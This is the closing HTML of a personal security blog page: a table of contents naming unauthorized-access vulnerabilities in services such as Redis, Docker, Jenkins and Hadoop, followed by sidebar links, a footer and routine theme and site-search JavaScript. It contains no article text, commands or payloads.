toc-nav-level-2"><a class="toc-nav-link" href="#CouchDB未授权访问漏洞（任意命令执行）"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">CouchDB未授权访问漏洞（任意命令执行）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-1"><span class="toc-nav-number">1.2.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-1"><span class="toc-nav-number">1.2.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-1"><span class="toc-nav-number">1.2.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Memcached未授权访问漏洞"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">Memcached未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-2"><span class="toc-nav-number">1.3.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-2"><span class="toc-nav-number">1.3.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-2"><span class="toc-nav-number">1.3.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ElasticSearch未授权访问漏洞"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">ElasticSearch未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-3"><span class="toc-nav-number">1.4.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-3"><span class="toc-nav-number">1.4.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-3"><span class="toc-nav-number">1.4.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#JBoss未授权访问漏洞"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">JBoss未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-4"><span class="toc-nav-number">1.5.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-4"><span class="toc-nav-number">1.5.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-4"><span class="toc-nav-number">1.5.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Rsync-未授权访问漏洞"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">Rsync 未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-5"><span class="toc-nav-number">1.6.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-5"><span class="toc-nav-number">1.6.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-5"><span class="toc-nav-number">1.6.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Redis未授权访问漏洞"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">Redis未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-6"><span class="toc-nav-number">1.7.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-6"><span class="toc-nav-number">1.7.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-6"><span class="toc-nav-number">1.7.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#VNC未授权访问漏洞"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">VNC未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-7"><span class="toc-nav-number">1.8.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-7"><span class="toc-nav-number">1.8.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-7"><span class="toc-nav-number">1.8.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Hadoop未授权访问漏洞"><span class="toc-nav-number">1.9.</span> <span class="toc-nav-text">Hadoop未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-8"><span class="toc-nav-number">1.9.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-8"><span class="toc-nav-number">1.9.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-8"><span class="toc-nav-number">1.9.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Docker未授权访问漏洞"><span class="toc-nav-number">1.10.</span> <span class="toc-nav-text">Docker未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-9"><span class="toc-nav-number">1.10.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-9"><span class="toc-nav-number">1.10.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-9"><span class="toc-nav-number">1.10.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Jenkins未授权访问漏洞"><span class="toc-nav-number">1.11.</span> <span class="toc-nav-text">Jenkins未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-10"><span class="toc-nav-number">1.11.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-10"><span class="toc-nav-number">1.11.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-10"><span class="toc-nav-number">1.11.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Jupyter-Notebook未授权访问漏洞"><span class="toc-nav-number">1.12.</span> <span class="toc-nav-text">Jupyter Notebook未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-11"><span class="toc-nav-number">1.12.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-11"><span class="toc-nav-number">1.12.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-11"><span class="toc-nav-number">1.12.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ActiveMQ未授权访问漏洞"><span class="toc-nav-number">1.13.</span> <span class="toc-nav-text">ActiveMQ未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-12"><span class="toc-nav-number">1.13.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-12"><span class="toc-nav-number">1.13.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-12"><span class="toc-nav-number">1.13.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#宝塔面板phpMyAdmin未授权访问漏洞"><span class="toc-nav-number">1.14.</span> <span class="toc-nav-text">宝塔面板phpMyAdmin未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因-13"><span class="toc-nav-number">1.14.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现-13"><span class="toc-nav-number">1.14.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复-13"><span class="toc-nav-number">1.14.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
        
        </div>
      </aside>
    


      <!-- Sidebar Container -->
      <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container">

        <!-- Featured Tags -->
        
        <section>
          <!-- no hr -->
          <h5>
            <a href="/tags/">FEATURED TAGS</a>
          </h5>
          <div class="tags">
            
          </div>
        </section>
        

        <!-- Friends Blog -->
        
        <hr>
        <h5>FRIENDS</h5>
        <ul class="list-inline">

          
          <li>
            <a href="https://www.getflag.cn/" target="_blank">kawhi</a>
          </li>
          
          <li>
            <a href="https://www.plasf.cn" target="_blank">Xiao Leung</a>
          </li>
          
          <li>
            <a href="https://www.redmango.top" target="_blank">HhhM</a>
          </li>
          
          <li>
            <a href="https://legoc.github.io" target="_blank">lego</a>
          </li>
          
        </ul>
        
      </div>
    </div>
  </div>
</article>



<!-- anchorjs start -->
<!-- async load function -->
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script type="text/javascript">
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function(e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  };
</script>
<script type="text/javascript">
  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
    anchors.options = {
      visible: 'hover',
      placement: 'left',
      // icon: 'ℬ'
      icon: '❡'
    };
    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
  });
</script>
<style>
  /* place left on bigger screen */
  @media all and (min-width: 800px) {
    .anchorjs-link {
      position: absolute;
      left: -0.75em;
      font-size: 1.1em;
      margin-top: -0.1em;
    }
  }
</style>

<!-- anchorjs end -->



	<!-- Footer (contains ThemeColor、viewer) -->
	<!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center">
          

          
            <li>
              <a target="_blank" href="https://github.com/tattooweb">
                <span class="fa-stack fa-lg">
                  <i class="fa fa-circle fa-stack-2x"></i>
                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
          

          

          

          

          

          

          

        </ul>
        <p class="copyright text-muted">
          Copyright &copy;
          Tattoo
          2021
          <br>
          Theme by
          <a href="http://beantech.org" target="_blank" rel="noopener">BeanTech</a>
          <span style="display: inline-block; margin: 0 5px;">
            <i class="fa fa-heart"></i>
          </span>
          re-Ported by
          <a href="https://v-vincen.life/" target="_blank" rel="noopener">Live My Life</a>
          |
          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
        </p>
      </div>
    </div>
  </div>
</footer>

<a id="rocket" href="#top" class=""></a>

<!-- jQuery -->
<script type="text/javascript" src="/js/jquery.min.js"></script>
<!-- <script type="text/javascript" src="/js/jquery.js"></script> -->
<!-- <script type="text/javascript" src="//cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script> -->

<!-- Bootstrap Core JavaScript -->
<script type="text/javascript" src="/js/bootstrap.min.js"></script>

<!-- Custom Theme JavaScript -->
<script type="text/javascript" src="/js/hux-blog.min.js"></script>

<!-- catalog -->
<script type="text/javascript" async="true" src="/js/catalog.js?v=1.0.0"></script>

<!-- totop(rocket) -->
<script type="text/javascript" async="true" src="/js/totop.js?v=1.0.0"></script>

<!-- Busuanzi JavaScript -->
<script type="text/javascript" async="true" src="/js/busuanzi.pure.mini.js"></script>


  <!-- Scroll start -->
  <script type="text/javascript" src="/js/scroll.js"></script>
  <!-- Scroll end -->



  <!-- ThemeColor start -->
  <script type="text/javascript" src="/js/themecolor.js"></script>
  <!-- ThemeColor end -->





  <!-- viewer start -->
  <!-- viewer start (Picture preview) -->
  <script type="text/javascript" src="/js/viewer/viewer.min.js"></script>
  <script type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
  <!-- viewer end -->


<script>
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function (e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  }

  // fastClick.js
  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
    var $nav = document.querySelector("nav");
    if ($nav)
      FastClick.attach($nav);
    }
  )
</script>

<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
<!-- <script> async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){ hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->

<!-- jquery.tagcloud.js -->
<!-- <script> // only load tagcloud.js in tag.html if($('#tag_cloud').length !== 0){ async("https://www.tattooo.top/js/jquery.tagcloud.js",function(){ $.fn.tagcloud.defaults = { //size: {start: 1, end: 1, unit: 'em'}, color: {start:
'#bbbbee', end: '#0085a1'}, }; $('#tag_cloud a').tagcloud(); }) } </script> -->


	<!-- Search -->
	
	<div class="popup search-popup local-search-popup">
  <span class="popup-btn-close">
    ESC
  </span>
  <div class="container">
    <div class="row">
      <!-- <div class="col-md-9 col-md-offset-1"> -->
      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">

        <div class="local-search-header clearfix">

          <div class="local-search-input-wrapper">
            <span class="search-icon">
              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
            </span>
            <input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
          </div>
        </div>
        <div id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>


  <script src="/js/ziploader.js"></script>
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.json";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    // monitor main search box;
    var onPopupClose = function (e) {
      $('.popup').fadeOut(300);
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $('.popup').fadeIn(300);
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }
    // get search zip version
    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
      if (localStorage.getItem('searchVersion') !== res) {
        localStorage.setItem('searchVersion', res);
        initSearchJson();
      }
    });

    function initSearchJson() {
      initLoad(['/search.flv'], {
        loadOptions: {
          success: function (obj) {
            localStorage.setItem('searchJson', obj['search.json'])
          },
          error: function (e) {
            return console.log(e)
          }
        },
        returnOptions: {
          'json': TYPE_TEXT
        },
        mimeOptions: {
          'json': 'application/json'
        }
      })
    }
    // search function;
    var searchFunc = function (search_id, content_id) {
      'use strict';
      isfetched = true;
      var datas = JSON.parse(localStorage.getItem('searchJson'));
      // console.log(search_id)
      var input = document.getElementById(search_id);
      var resultContent = document.getElementById(content_id);
      var inputEventFunction = function () {
        var searchText = input.value.trim().toLowerCase();
        var keywords = searchText.split(/[\s\-]+/);
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        var resultItems = [];
        if (searchText.length > 0) {
          // perform local searching
          datas.forEach(function (data) {
            var isMatch = false;
            var hitCount = 0;
            var searchTextCount = 0;
            var title = data.title
              ? data.title.trim()
              : '';
            var titleInLowerCase = title.toLowerCase();
            var content = data.content
              ? data.content.trim().replace(/<[^>]+>/g, "")
              : '';
            var contentInLowerCase = content.toLowerCase();
            var articleUrl = decodeURIComponent(data.url);

            var date = data.date;
            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
            var imgUrl = data.header_img;

            var indexOfTitle = [];
            var indexOfContent = [];
            // only match articles with not empty titles
            keywords.forEach(function (keyword) {
              function getIndexByWord(word, text, caseSensitive) {
                var wordLen = word.length;
                if (wordLen === 0) {
                  return [];
                }
                var startPosition = 0,
                  position = [],
                  index = [];
                if (!caseSensitive) {
                  text = text.toLowerCase();
                  word = word.toLowerCase();
                }
                while ((position = text.indexOf(word, startPosition)) > -1) {
                  index.push({position: position, word: word});
                  startPosition = position + wordLen;
                }
                return index;
              }
              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
            });
            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
              isMatch = true;
              hitCount = indexOfTitle.length + indexOfContent.length;
            }
            // show search results
            if (isMatch) {
              // sort index by position of keyword
              [indexOfTitle, indexOfContent].forEach(function (index) {
                index.sort(function (itemLeft, itemRight) {
                  if (itemRight.position !== itemLeft.position) {
                    return itemRight.position - itemLeft.position;
                  } else {
                    return itemLeft.word.length - itemRight.word.length;
                  }
                });
              });
              // merge hits into slices
              function mergeIntoSlice(text, start, end, index) {
                var item = index[index.length - 1];
                var position = item.position;
                var word = item.word;
                var hits = [];
                var searchTextCountInSlice = 0;
                while (position + word.length <= end && index.length != 0) {
                  if (word === searchText) {
                    searchTextCountInSlice++;
                  }
                  hits.push({position: position, length: word.length});
                  var wordEnd = position + word.length;
                  // move to next position of hit
                  index.pop();
                  while (index.length != 0) {
                    item = index[index.length - 1];
                    position = item.position;
                    word = item.word;
                    if (wordEnd > position) {
                      index.pop();
                    } else {
                      break;
                    }
                  }
                }
                searchTextCount += searchTextCountInSlice;
                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
              }
              var slicesOfTitle = [];
              if (indexOfTitle.length != 0) {
                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
              }
              var slicesOfContent = [];
              while (indexOfContent.length != 0) {
                var item = indexOfContent[indexOfContent.length - 1];
                var position = item.position;
                var word = item.word;
                // cut out 100 characters
                var start = position - 20;
                var end = position + 80;
                if (start < 0) {
                  start = 0;
                }
                if (end < position + word.length) {
                  end = position + word.length;
                }
                if (end > content.length) {
                  end = content.length;
                }
                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
              }
              // sort slices in content by search text's count and hits' count
              slicesOfContent.sort(function (sliceLeft, sliceRight) {
                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                  return sliceRight.hits.length - sliceLeft.hits.length;
                } else {
                  return sliceLeft.start - sliceRight.start;
                }
              });
              // select top N slices in content
              var upperBound = parseInt('1');
              if (upperBound >= 0) {
                slicesOfContent = slicesOfContent.slice(0, upperBound);
              }
              // highlight title and content
              function highlightKeyword(text, slice) {
                var result = '';
                var prevEnd = slice.start;
                slice.hits.forEach(function (hit) {
                  result += text.substring(prevEnd, hit.position);
                  var end = hit.position + hit.length;
                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                  prevEnd = end;
                });
                result += text.substring(prevEnd, slice.end);
                return result;
              }
              var resultItem = '';

              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
              // "...</p></a>"; }); resultItem += "</li>";

              if (slicesOfTitle.length != 0) {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
              } else {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
              }
              slicesOfContent.forEach(function (slice) {
                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
              });
              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";

              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
            }
          })
        };

        if (keywords.length === 1 && keywords[0] === "") {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else if (resultItems.length === 0) {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else {
          resultItems.sort(function (resultLeft, resultRight) {
            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
              return resultRight.searchTextCount - resultLeft.searchTextCount;
            } else if (resultLeft.hitCount !== resultRight.hitCount) {
              return resultRight.hitCount - resultLeft.hitCount;
            } else {
              return resultRight.id - resultLeft.id;
            }
          });
          var searchResultList = '<div class=\"search-result-list\">';
          resultItems.forEach(function (result) {
            searchResultList += result.item;
          })
          searchResultList += "</div>";
          resultContent.innerHTML = searchResultList;
        }
      }
      if ('auto' === 'auto') {
        input.addEventListener('input', inputEventFunction);
      } else {
        $('.search-icon').click(inputEventFunction);
        input.addEventListener('keypress', function (event) {
          if (event.keyCode === 13) {
            inputEventFunction();
          }
        });
      }
      // remove loading animation
      $('body').css('overflow', '');
      proceedsearch();
    }
    // handle and trigger popup window;
    $('.popup-trigger').click(function (e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc('local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });
    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function (e) {
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });

    document.addEventListener('mouseup', (e) => {
      var _con = document.querySelector(".local-search-content");
      if (_con) {
        if (!_con.contains(e.target)) {
          onPopupClose();
        }
      }
    });
  </script>


	

	<!-- Image to hack wechat -->
	<!-- <img src="https://www.tattooo.top/img/icon_wechat.png" width="0" height="0" /> -->
	<!-- Migrate from head to bottom, no longer block render and still work -->

</body>

</html>
